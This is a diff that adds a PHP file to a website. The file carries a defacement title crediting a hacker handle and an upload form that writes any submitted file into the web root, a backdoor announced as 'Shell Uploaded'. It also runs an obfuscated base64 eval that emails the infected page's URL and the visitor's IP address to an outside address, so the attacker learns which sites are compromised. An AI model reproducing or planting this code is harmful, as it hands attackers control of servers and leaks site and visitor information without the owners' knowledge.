@@ -1,0 +1,4 @@
+<title>Vuln!! patch it Now! Hacked by @Kovacs07</title><?php echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if( $_POST['_upl'] == "Upload" ) {if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }else { echo '<b>Not uploaded ! </b><br><br>'; }}?>
+<?php
+eval(base64_decode('JHR1anVhbm1haWwgPSAnYWd1ZWJzaTExQGdtYWlsLmNvbSc7CiR4X3BhdGggPSAiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAuICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7Cm1haWwoJHR1anVhbm1haWwsICJDb250YWN0IE1lIiwgJHBlc2FuX2FsZXJ0LCAiWyAiIC4gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gLiAiIF0iKTs=='));
+?>
